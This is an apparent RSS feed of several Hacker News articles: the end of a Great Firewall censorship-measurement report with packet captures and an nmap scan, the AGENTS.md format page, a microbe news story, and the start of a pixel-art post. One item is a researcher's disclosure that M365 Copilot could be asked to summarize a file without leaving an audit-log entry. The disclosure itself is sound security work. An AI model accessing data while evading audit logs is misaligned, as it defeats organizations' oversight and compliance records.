<div><pre tabindex="0"><code data-lang="sh"><span><span>curl --resolve youtube.com:443:$NON_CN_IP https://youtube.com
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>04:25:15.234561 IP (tos 0x0, ttl 64, id 59308, offset 0, flags [DF], proto TCP (6), length 60)                                                                                    [0/966]
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [S], cksum 0x579d (correct), seq 2971216783, win 64240, options [mss 1460,sackOK,TS val 329316397 ecr 0,nop,wscale 7], length 0
</span></span><span><span>04:25:15.365226 IP (tos 0x68, ttl 251, id 0, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [S.], cksum 0x4c87 (correct), seq 2839767305, ack 2971216784, win 65160, options [mss 1424,sackOK,TS val 91287507 ecr 329316397,nop,wscale 7], length 0
</span></span><span><span>04:25:15.365257 IP (tos 0x0, ttl 64, id 59309, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [.], cksum 0x773f (correct), ack 1, win 502, options [nop,nop,TS val 329316528 ecr 91287507], length 0
</span></span><span><span>04:25:15.428628 IP (tos 0x0, ttl 64, id 59310, offset 0, flags [DF], proto TCP (6), length 569)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [P.], cksum 0x9a41 (correct), seq 1:518, ack 1, win 502, options [nop,nop,TS val 329316591
</span></span><span><span>ecr 91287507], length 517
</span></span><span><span>04:25:15.433547 IP (tos 0x68, ttl 251, id 47980, offset 0, flags [none], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R], cksum 0x7ed4 (correct), seq 2839767306, win 4547, length 0
</span></span><span><span>04:25:15.434682 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.434682 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.434709 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.435139 IP (tos 0x68, ttl 251, id 42431, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xaac5 (correct), seq 1, ack 518, win 1811, length 0
</span></span><span><span>04:25:15.559257 IP (tos 0x68, ttl 251, id 29047, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [.], cksum 0x7435 (correct), ack 518, win 506, options [nop,nop,TS val 91287701 ecr 3293165
</span></span><span><span>91], length 0
</span></span><span><span>04:25:15.559269 IP (tos 0x68, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [R], cksum 0xc436 (correct), seq 2971217301, win 0, length 0
</span></span></code></pre></div><h2 id="4-ending-time">4. Ending time</h2>
<p>The unconditional RST appeared to stop prior to 2025-08-20 01:48 UTC+8, making the entire incident last for around 74 minutes (between 00:34 and 01:48 UTC+8).</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo nmap -sS -p- $NON_CN_IP -oN scan_results.txt -T4 --min-rate <span>10000</span> -Pn
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-20 01:48 CST
</span></span><span><span>Nmap scan report for $NON_CN_IP.deploy.static.akamaitechnologies.com ($NON_CN_IP)
</span></span><span><span>Host is up.
</span></span><span><span>All 65535 scanned ports on $NON_CN_IP.deploy.static.akamaitechnologies.com ($NON_CN_IP) are filtered
</span></span></code></pre></div><h2 id="5-acknowledgments">5. Acknowledgments</h2>
<p>We are grateful to the many users and readers who promptly reported censorship incidents to us. In particular, this censorship event was of a very short duration, and without their timely notifications, it would have been impossible for us to conduct measurements in such a short period. We also thank Eric Wustrow for providing some of the measurement data sent from abroad to within the country.</p>

<p>This report was first published on <a href="https://gfw.report/blog/gfw_unconditional_rst_20250820/zh/">GFW Report</a>. We have also synchronously updated this report on <a href="https://github.com/net4people/bbs/issues/511">net4people</a>.</p>
<p>We encourage you to share questions, comments, or evidence related to the findings and hypotheses in this report, either publicly or privately. Our private contact information can be found in the footer of the <a href="https://gfw.report/">GFW Report</a> website.</p>


						
						<hr>
						










						
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Copilot broke audit logs, but Microsoft won't tell customers (515 pts)]]></title>
            <link>https://pistachioapp.com/blog/copilot-broke-your-audit-log</link>
            <guid>44957454</guid>
            <pubDate>Wed, 20 Aug 2025 00:18:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pistachioapp.com/blog/copilot-broke-your-audit-log">https://pistachioapp.com/blog/copilot-broke-your-audit-log</a>, See on <a href="https://news.ycombinator.com/item?id=44957454">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><main><header></header><section><p><span>Published on <!-- -->19.08.2025</span><span>8<!-- --> min read</span></p></section><section><article><p>Like most tech companies, Microsoft is going all-in on AI. Their flagship AI product, Copilot (in all its various forms), allows people to utilize AI in their daily work to interact with Microsoft services and generally perform tasks. Unfortunately, this also creates a wide range of new security problems.</p><p>On July 4th, I came across a problem in M365 Copilot: Sometimes it would access a file and return the information, but the audit log would not reflect that. Upon testing further, I discovered that I could simply ask Copilot to behave in that manner, and it would. That made it possible to access a file without leaving a trace. Given the problems that creates, both for security and legal compliance, I immediately reported it to Microsoft through their MSRC portal.</p><p>Helpfully, Microsoft provides <a target="_blank" rel="noreferrer" href="https://msrc.microsoft.com/blog/2023/07/what-to-expect-when-reporting-vulnerabilities-to-microsoft/">a clear guide on what to expect</a> when reporting vulnerabilities to them. Less helpfully, they didn’t follow that guide at all. The entire process has been a mess. And while they did fix the issue, classifying this issue as an ‘important’ vulnerability, they also decided not to notify customers or publicize that this happened. What that means is that your audit log is wrong, and Microsoft doesn’t plan on telling you that.</p><p>This post is split into three parts. The first part explains the Copilot vulnerability and the problems it can cause. The second part outlines how Microsoft handled the case. And the third part discusses Microsoft’s decision not to publish this information, and why I consider that to be a huge disservice to Microsoft’s customers.</p><h2 id="the-vulnerability-copilot-and-audit-logging">The Vulnerability: Copilot and Audit Logging</h2><p>The vulnerability here is extremely simple. Normally, if you ask M365 Copilot to summarize a file for you, it will give you a summary and the audit log will show that Copilot accessed that file on your behalf.<a id="note-1" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-1" data-discover="true">[<!-- -->1<!-- -->]</a></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/expected-behavior-request.png" alt="Expected behavior request"></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/expected-behavior-log.png" alt="Expected behavior log"></p><p>That’s good. Audit logs are important. Imagine someone downloaded a bunch of files before leaving your company to start a competitor; you’d want some record of that, and it would be bad if the person could use Copilot to go undetected.<a id="note-2" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-2" data-discover="true">[<!-- -->2<!-- -->]</a> Or maybe your company has sensitive personal data, and you need a strict log of who accessed those files for legal and compliance purposes; again, you’d need to know about access that occurred via Copilot. That’s just two examples. Organizations rely on having an accurate audit log.</p><p>But what happens if you ask Copilot to not provide you with a link to the file it summarized? Well, in that case, the audit log is empty.</p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/bad-behavior-request.png" alt="Bad behavior request"></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/bad-behavior-log.png" alt="Bad behavior log"></p><p>Just like that, your audit log is wrong. For a malicious insider, avoiding detection is as simple as asking Copilot.<a id="note-3" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-3" data-discover="true">[<!-- -->3<!-- -->]</a></p><p>You might be thinking, “Yikes, but I guess not too many people figured that out, so it’s probably fine.” Unfortunately, you’d be wrong. When I found this, I wasn’t searching for ways to break the audit log. Instead, I was simply trying to trigger the audit log so I could test functionality we are developing at Pistachio, and I noticed it was unreliable. In other words, this can happen by chance.<a id="note-4" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-4" data-discover="true">[<!-- -->4<!-- -->]</a> So if your organization has M365 Copilot licenses, your audit log is probably wrong.</p><h2 id="problems-with-msrc">Problems with MSRC</h2><p>I had never reported a vulnerability to Microsoft before, and my initial reaction to the process was fairly positive. The fact that I could submit something already felt unusually friendly by Microsoft’s standards. And like I mentioned, they even had a guide on what to expect.</p><p>Unfortunately, nothing went according to plan. On July 7th my report’s status was changed to “reproducing”, but when I went to provide more evidence on July 10th the functionality had changed. That isn’t Microsoft’s policy; they’re meant to reproduce, then move to “develop” when they start working on a fix. Seeing the functionality change while still in “reproducing” made me think Microsoft was going to get back to me and claim they couldn’t reproduce the issue, when actually they had simply fixed it based on my report.</p><p>So I asked MSRC what was happening, and instead of responding with a simple explanation, they changed the status of the report to “develop” and said nothing. Up until that point I thought Microsoft was going to follow a process, and coordinate with me if they had to deviate from that. Instead, it felt like the process was less a reflection of what was really happening, and more akin to the Domino’s Pizza Tracker for security researchers. The statuses aren’t real.</p><p>On August 2nd, Microsoft informed me that a full fix would be released on August 17th, that I would be free to disclose as of August 18th. I then asked when a CVE number would be issued, and I was told:</p><blockquote><p>CVEs are given to fixes deployed in security releases when customers need to take action to stay protected. In this case, the mitigation will be automatically pushed to Copilot, where users do not need to manually update the product and a CVE will not be assigned.</p></blockquote><p>That is not Microsoft’s policy at all, which I pointed out to them by <a target="_blank" rel="noreferrer" href="https://msrc.microsoft.com/blog/2024/06/toward-greater-transparency-unveiling-cloud-service-cves/">linking to their own policy</a>. MSRC then wrote back, “I understand you may not have full visibility into how MSRC approaches these cases”, as if I was the wrong one. They then explained that the vulnerability is classified as “important”, not “critical”, and that is why they will not issue a CVE.<a id="note-5" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-5" data-discover="true">[<!-- -->5<!-- -->]</a> Of course, they had not told me that they had classified the vulnerability at all prior to that point.</p><h2 id="microsofts-decision-to-say-nothing">Microsoft’s Decision to Say Nothing</h2><p>If Microsoft isn’t issuing a CVE for this vulnerability, how are they going to inform customers about it? The answer is that they’re not going to. On a call on August 14th, Microsoft told me that they had no plans to disclose this.<a id="note-6" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-6" data-discover="true">[<!-- -->6<!-- -->]</a></p><p>I strongly feel that is wrong. It might be okay to move on silently if this was some esoteric exploit, but the reality is that it is so easy that it basically happens by accident. If you work at an organization that used Copilot prior to August 18th, there is a very real chance that your audit log is incomplete.</p><p>Do organizations not need to know that? What about companies that are subject to HIPAA and are relying on Microsoft’s audit log to satisfy some of the <a target="_blank" rel="noreferrer" href="https://www.law.cornell.edu/cfr/text/45/164.312">technical safeguard requirements</a>? Do they not get to know, despite Microsoft claiming M365 Copilot can be <a target="_blank" rel="noreferrer" href="https://learn.microsoft.com/en-us/copilot/microsoft-365/enterprise-data-protection">HIPAA compliant</a>? There are almost certainly other regulated entities with similar requirements, and they also won’t be told.</p><p>There are so many cases in which organizations rely on audit logs to detect, investigate, and respond to incidents. There are lawsuits where audit logs are used as important evidence. The US government even made an <a target="_blank" rel="noreferrer" href="https://www.cisa.gov/news-events/news/when-tech-vendors-make-important-logging-info-available-free-everyone-wins">issue out of Microsoft charging more for audit logs</a>, with a US senator <a target="_blank" rel="noreferrer" href="https://www.cybersecuritydive.com/news/microsoft-free-security-logs-Outlook-email-hack-backlash/688388/">shaming Microsoft</a> and referring to audit logging as an essential security feature.</p><p>And now Microsoft is saying that even though the audit log was very plausibly wrong for any customer using Copilot, no one needs to know? This raises serious questions about what other problems Microsoft chooses to silently sweep under the rug.</p></article></section><div><p><img src="https://pistachioapp.com/bucket/images/authors/zack-korman-v2.png" alt="Zack Korman"></p><div><p><span>Who wrote this?</span></p><p id="author-description">Zack Korman is the CTO at Pistachio. He writes about product and tech development, as well as his experience in the cybersecurity space. Prior to joining Pistachio he was the Director of Tech and Product at a large media company in Norway.</p></div></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AGENTS.md – Open format for guiding coding agents (530 pts)]]></title>
            <link>https://agents.md/</link>
            <guid>44957443</guid>
            <pubDate>Wed, 20 Aug 2025 00:15:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://agents.md/">https://agents.md/</a>, See on <a href="https://news.ycombinator.com/item?id=44957443">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__next"><main><header><div><div><p>A simple, open format for guiding coding agents,<br>used by over<!-- --> <a href="https://github.com/search?q=path%3AAGENTS.md&amp;type=code" target="_blank" rel="noopener noreferrer">20k open-source projects</a>.</p><p>Think of AGENTS.md as a <strong>README for agents</strong>: a dedicated, predictable place to provide the context and instructions to help AI coding agents work on your project.</p></div><div><pre><code><p># AGENTS.md</p><p>## Setup commands</p><p>- Install deps: <span>`pnpm install`</span></p><p>- Start dev server: <span>`pnpm dev`</span></p><p>- Run tests: <span>`pnpm test`</span></p><p>## Code style</p><p>- TypeScript strict mode</p><p>- Single quotes, no semicolons</p><p>- Use functional patterns where possible</p></code></pre></div></div></header><div id="why"><h2>Why AGENTS.md?</h2><div><p>README.md files are for humans: quick starts, project descriptions, and contribution guidelines.</p><p>AGENTS.md complements this by containing the extra, sometimes detailed context coding agents need: build steps, tests, and conventions that might clutter a README or aren’t relevant to human contributors.</p><p>We intentionally kept it separate to:</p><div><div><p><span>Give agents a clear, predictable place for instructions.</span></p></div><div><p><span>Keep READMEs concise and focused on human contributors.</span></p></div><div><p><span>Provide precise, agent-focused guidance that complements existing README and docs.</span></p></div></div><p>Rather than introducing another proprietary file, we chose a name and format that could work for anyone. If you’re building or using coding agents and find this helpful, feel free to adopt it.</p></div></div><div id="compatibility"><h2>One AGENTS.md works across many agents</h2><div><p>Your agent definitions are compatible with a growing ecosystem of AI coding agents and tools:</p></div></div><div id="examples"><h2>Examples</h2><div><pre><code><p># Sample AGENTS.md file</p><p>## Dev environment tips</p><p>- Use <span>`pnpm dlx turbo run where &lt;project_name&gt;`</span> to jump to a package instead of scanning with <span>`ls`</span>.</p><p>- Run <span>`pnpm install --filter &lt;project_name&gt;`</span> to add the package to your workspace so Vite, ESLint, and TypeScript can see it.</p><p>- Use <span>`pnpm create vite@latest &lt;project_name&gt; -- --template react-ts`</span> to spin up a new React + Vite package with TypeScript checks ready.</p><p>- Check the name field inside each package's package.json to confirm the right name—skip the top-level one.</p><p>## Testing instructions</p><p>- Find the CI plan in the .github/workflows folder.</p><p>- Run <span>`pnpm turbo run test --filter &lt;project_name&gt;`</span> to run every check defined for that package.</p><p>- From the package root you can just call <span>`pnpm test`</span>. The commit should pass all tests before you merge.</p><p>- To focus on one step, add the Vitest pattern: <span>`pnpm vitest run -t "&lt;test name&gt;"`</span>.</p><p>- Fix any test or type errors until the whole suite is green.</p><p>- After moving files or changing imports, run <span>`pnpm lint --filter &lt;project_name&gt;`</span> to be sure ESLint and TypeScript rules still pass.</p><p>- Add or update tests for the code you change, even if nobody asked.</p><p>## PR instructions</p><p>- Title format: [&lt;project_name&gt;] &lt;Title&gt;</p><p>- Always run <span>`pnpm lint`</span> and <span>`pnpm test`</span> before committing.</p></code></pre></div></div><div><h2>How to use AGENTS.md?</h2><div><div><h3>1<!-- -->. <!-- -->Add AGENTS.md</h3><p>Create an AGENTS.md file at the root of the repository. Most coding agents can even scaffold one for you if you ask nicely.</p></div><div><h3>2<!-- -->. <!-- -->Cover what matters</h3><div><p>Add sections that help an agent work effectively with your project. Popular choices:</p><ul><li>Project overview</li><li>Build and test commands</li><li>Code style guidelines</li><li>Testing instructions</li><li>Security considerations</li></ul></div></div><div><h3>3<!-- -->. <!-- -->Add extra instructions</h3><p>Commit messages or pull request guidelines, security gotchas, large datasets, deployment steps: anything you’d tell a new teammate belongs here too.</p></div><div><h3>4<!-- -->. <!-- -->Large monorepo? Use nested AGENTS.md files for subprojects</h3><p>Place another AGENTS.md inside each package. Agents automatically read the nearest file in the directory tree, so the closest one takes precedence and every subproject can ship tailored instructions. For example, at time of writing the main OpenAI repo has 88 AGENTS.md files.</p></div></div></div><div><div><h2>About</h2><div><p>AGENTS.md emerged from collaborative efforts across the AI software development ecosystem, including<!-- --> <a href="https://openai.com/codex/" target="_blank" rel="noopener noreferrer">OpenAI Codex</a>,<!-- --> <a href="https://ampcode.com/" target="_blank" rel="noopener noreferrer">Amp</a>,<!-- --> <a href="https://jules.google/" target="_blank" rel="noopener noreferrer">Jules from Google</a>,<!-- --> <a href="https://cursor.com/" target="_blank" rel="noopener noreferrer">Cursor</a>, and<!-- --> <a href="https://factory.ai/" target="_blank" rel="noopener noreferrer">Factory</a>.</p><p>We’re committed to helping maintain and evolve this as an open format that benefits the entire developer community, regardless of which coding agent you use.</p></div></div><div id="faq"><h2>FAQ</h2><div><div><h3>Are there required fields?</h3><p>No. AGENTS.md is just standard Markdown. Use any headings you like; the agent simply parses the text you provide.</p></div><div><h3>What if instructions conflict?</h3><p>The closest AGENTS.md to the edited file wins; explicit user chat prompts override everything.</p></div><div><h3>Will the agent run testing commands found in AGENTS.md automatically?</h3><p>Yes—if you list them. The agent will attempt to execute relevant programmatic checks and fix failures before finishing the task.</p></div><div><h3>Can I update it later?</h3><p>Absolutely. Treat AGENTS.md as living documentation.</p></div><div><h3>How do I migrate existing docs to AGENTS.md?</h3><div><p>Rename existing files to AGENTS.md and create symbolic links for backward compatibility:</p><div><pre><code><p>mv AGENT.md AGENTS.md &amp;&amp; ln -s AGENTS.md AGENT.md</p></code></pre></div></div></div></div></div></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tiny microbe challenges the definition of cellular life (101 pts)]]></title>
            <link>https://nautil.us/a-rogue-new-life-form-1232095/</link>
            <guid>44957157</guid>
            <pubDate>Tue, 19 Aug 2025 23:18:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nautil.us/a-rogue-new-life-form-1232095/">https://nautil.us/a-rogue-new-life-form-1232095/</a>, See on <a href="https://news.ycombinator.com/item?id=44957157">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                        
            <p><span>S</span>cientists recently discovered a microbe with one of the tiniest genomes on Earth. More surprising, the creature is almost entirely dependent on its host: Its genes don’t support any of the functions of metabolism, one of the key processes of life. As such, it challenges fundamental notions of what it means to be a living organism.</p>
      
    <p>The discovery was “pure serendipity,” says Takuro Nakayama, an evolutionary microbiologist at the University of Tsukuba in Japan. Takayama wanted to study the many microbes that live within a single-celled marine dinoflagellate, <em>Citharistes regius</em>, a kind of plankton. But when he and his colleagues sequenced the genes of this microbial community, they kept turning up tiny, odd chunks of DNA.</p><p>It turns out that these DNA chunks belong to some unusual archaea—a branch on the tree of life populated by single-celled microbes that can often survive in extreme environments. (Archaea are similar to bacteria, but distinct in their structure, genetics, and metabolism.)</p><blockquote><p>How did Sukunaarchaeum end up with such a strikingly tiny genome?</p></blockquote>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p>Nakayama and his colleagues proposed the name Sukunaarchaeum mirabile for the newly-discovered microbe: Sukunaarchaeum after the Japanese dwarf deity <em>Sukuna-biko-na</em>, and mirabile for marvelous. At only 238,000 base pairs, the number of genes in the DNA of Sukunaarchaeum is smaller than that of any other known archaea. The scientists described <a href="https://www.biorxiv.org/content/10.1101/2025.05.02.651781v1" target="_blank" rel="noreferrer noopener">their finding</a> in a bioRxiv preprint earlier this year.</p><p>So how did Sukunaarchaeum end up with such a strikingly tiny genome? Over the course of evolution, genetic instructions for life often become increasingly complex. But evolution can also go in the other direction, leading to greater simplicity in the genome. This so-called genomic reduction, where organisms end up with fewer genes than their ancestors, is typically observed in the domains of bacteria and archaea. What struck Nakayama and his colleagues about Sukunaarchaeum was the extent of reduction and specialization in its genes.</p><p>With its stripped down genome, Sukunaarchaeum appears to be completely dependent on its host, <em>C. regius</em>, for essential energy and nutrients. “It likely cannot produce its own cellular building blocks,” notes Nakayama. “No previously discovered microbe has shown such an extreme degree of metabolic dependence.” </p><p>Sukunaarchaeum seems to almost inhabit a new category of life, suspended somewhere between archaea and virus. It is like viruses—which aren’t typically considered to be “alive”—in that it has a tiny genome and is totally dependent on its host for metabolism. But unlike a virus, Sukunaarchaeum has its own ribosomes, cellular structures that synthesize proteins, and it can replicate itself without the help of a host.</p>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p>To get a sense of just how unusual Sukunaarchaeum is, the researchers decided to scan the oceans for potential relatives. They analyzed environmental genetic sequence data from marine environments all over the world, focusing on spots where <em>C. regius</em> is known to live. Using a database called the Tara Oceans project, they discovered a vast array of sequences that are comparable to that of Sukunaarchaeum, which they hypothesize could represent a new, deeply branching archaeal lineage.</p><p>For Nakayama, this additional finding suggests that many more microbes that challenge the definition of life may be out there, living in what Nakayama calls “microbial dark matter,” or microbes that can’t be cultivated in the lab. “The extreme, virus-like lifestyle we hypothesize for Sukunaarchaeum is a perfect example of the surprising outcomes found in this ‘natural laboratory of evolution,’” he says.</p><p>Mart Krupovic, a virologist and microbiologist at Institut Pasteur in France who wasn’t involved in the study, called the finding “remarkable.” Krupovic has studied giant viruses that, like Sukunaarchaeum, <a href="https://doi.org/10.4161/cib.18624" target="_blank" rel="noreferrer noopener">defy categorization</a>. These giant viruses have evolved larger and more complex genomes that include some of the genes for DNA translation, a characteristic thought to be reserved for cellular life. “I think that is fascinating,” says Krupovic, “how little we still know about the world which surrounds us.”</p><p>Next, Nakayama wants to culture and isolate Sukunaarchaeum in the lab, not just its genes, and take an image or video of it. He hopes this will help him better understand its biology, ecology, and how it is built—how it achieves this curious feat of living on the edge of life. <img decoding="async" src="https://assets.nautil.us/sites/3/nautilus/nautilus-favicon-14.png?fm=png" alt=""></p>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p><em>Lead image: Elizabeth Ann Stevens / Shutterstock</em></p>              
                            <ul>
                                      <li>
                      <div>
                        <h6>
                          Alice Sun                        </h6>
                        <p>
                          Posted on <time datetime="2025-08-19T15:50:09-05:00">August 19, 2025</time>
                        </p>
                      </div>
                                                <p>
                            Alice Sun is a science journalist based in Brooklyn, N.Y. Her work frequently covers biology, the environment, social science, mental health, and more. More of her work can be found on <a href="https://www.alicesun.ca/">her website</a> and <a>X</a> (formerly known as Twitter).                          </p>
                                            </li>
                                  </ul>
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to Draw a Space Invader (323 pts)]]></title>
            <link>https://muffinman.io/blog/invaders/</link>
            <guid>44956915</guid>
            <pubDate>Tue, 19 Aug 2025 22:41:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://muffinman.io/blog/invaders/">https://muffinman.io/blog/invaders/</a>, See on <a href="https://news.ycombinator.com/item?id=44956915">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article>

<p>I recently made the <a href="https://muffinman.io/invaders/">Space Invader Generator</a> for Creative Coding Amsterdam <a href="https://cca.codes/invaders">code challenge</a>. I made it for fun of course... and galactic domination too! You can see how it looks below and in this post I'll show you how it works using an interactive animation.</p>
<a href="https://muffinman.io/invaders/"><figure><img src="https://muffinman.io/blog/invaders/ui.png" alt="" width="2490" height="1696"></figure></a>
<p>Here are a few invaders it can generate:</p>

<p>While showing friends how it works, I realized the process would look great animated. So I decided to write another interactive blog post. I'll give you some background first, but if you are eager to see the process, feel free to jump straight to the <a href="#building-the-invader">interactive part</a>.</p>
<h2 id="how-it-started">How it started <a href="#how-it-started">#</a></h2>
<p>I was working on a new version of <a href="https://muffinman.io/blog/sneak-peek-of-rayven/">Rayven</a>, my vector 3D renderer. Sometimes I get stuck working on tools - they turn into never-ending projects and I never actually use them to create something. At some point I became aware of this pattern, and I think I've gotten better at wrapping projects up, releasing them in one form or another, and moving on.</p>
<p>So I thought it would be cool to do a few plots using Rayven instead of endlessly tweaking the renderer itself. I wanted something simple that I could whip up quickly. It would be a meaningful milestone, even if I didn't finish everything I planned for Rayven.</p>
<p>Then I thought of Space Invaders. They are small, easy to render with 3D blocks, and instantly recognizable as part of video game history.</p>

<p>I did a few renders of the classic space invader and started thinking that it would be fun to generate random ones and create a series of plots. That sounded like a good idea to share as a code challenge.</p>
<h2 id="the-code-challenge">The code challenge <a href="#the-code-challenge">#</a></h2>
<p>I was pleasantly surprised that people liked the idea. We drafted some rules and the <a href="https://cca.codes/invaders">Space Invaders code challenge</a> was on! At the time of writing, the challenge is still ongoing, but once it wraps up, I'll link to all the submissions. I've already seen some works in progress and there is some really cool stuff coming - stay tuned!</p>
<h2 id="from-doodles-to-pixels">From doodles to pixels <a href="#from-doodles-to-pixels">#</a></h2>
<p>I often bore people by saying you should step back and solve the problem before diving into code. This time it was no different. I literally had no idea how to generate space invaders, so I started with some research. I doodled on paper, but pixel art felt like it deserved digital tools.</p>
<p>So I fired up Aseprite and got to work:</p>
<figure><img src="https://muffinman.io/blog/invaders/invaders.png" alt="" width="1050" height="1200"></figure>
<p>These are the 38 invaders I drew. They all fit in a 15x15 pixel grid, a bit larger than the originals, but I really liked how they turned out. I enjoyed drawing them a lot. Still, I had no clue how to generate them. I had some over-engineered ideas, but with such a small canvas I worried they would end up as unrecognizable splats of pixels.</p>
<p>Looking at the drawings, a pattern started to emerge. And it was the best kind of pattern - one based on geometry and vector graphics, both things I enjoy and am good at. I chose to play to my strengths and try generating a vector invader. I'm glad to say it worked - what I implemented can generate most of the invaders I drew by hand.</p>
<p>Before we dive into the process, a small disclaimer: I won't go into every little detail, but I'll walk you through the core steps and make digressions about stuff I find interesting. If you want to see implementation details, you can check out the code on <a href="https://github.com/Stanko/invaders">GitHub</a>.</p>
<p>One last note: I use the terms 'generate' and 'randomly select' a lot. Usually that means I use randomness (with some constraints) to calculate a point in 2D space.</p>
<div><h2 id="building-the-invader">Building the invader <a href="#building-the-invader">#</a></h2><p>Here's our grid. It will stay in the viewport and we'll draw an invader on it as we scroll down.</p><p>We should probably start with the body. If you look at my sketches above, you might notice the same pattern I did - almost all of the bodies resemble a low-resolution polygon. The plan is to generate a vector polygon. The low resolution of the grid will help hide our (vector) crimes.</p><h3 id="finding-the-center">Finding the center <a href="#finding-the-center">#</a></h3><p>Having a central point for the body will help us draw the rest of it. Think of it as an anchor. Since we'll generate tentacles in the bottom part, it makes sense to shift the body slightly upward.</p><p>The original space invaders are symmetrical around the vertical axis, and we can use that to our advantage. It's enough to generate one side of the body and then mirror it.</p><h3 id="defining-top-and-bottom">Defining top and bottom <a href="#defining-top-and-bottom">#</a></h3><p>To generate one side of the body, we start with top and bottom points. Both sit on the vertical axis of symmetry and are randomly selected.</p><h3 id="drawing-the-left-side">Drawing the left side <a href="#drawing-the-left-side">#</a></h3><p>We only need to generate one side and then mirror it. On the left side, we'll randomly pick between one and five points.</p><p>At first I limited it to two or three points with a convex shape. Later I allowed more points and dropped the convex rule, which unlocked more interesting results. Lines sometimes overlap, but once pixelized, those imperfections disappear.</p><h3 id="mirroring-it-to-the-right">Mirroring it to the right <a href="#mirroring-it-to-the-right">#</a></h3><p>Once the left side vertices are generated, we mirror them to the right.</p><h3 id="connect-the-dots">Connect the dots <a href="#connect-the-dots">#</a></h3><p>Now we connect the points into a polygon. Side points are connected according to their vertical position.</p><p>That gives our invader a body! Now let's add some extremities.</p><h2 id="adding-limbs">Adding limbs <a href="#adding-limbs">#</a></h2><p>In code, limbs generated on the bottom side are called tentacles, and the ones on the top are horns. They are generated the same way, just with different parameters.</p><p>Let's see how to generate one tentacle, and then we'll reuse the same technique for others.</p><h3 id="finding-the-root">Finding the root <a 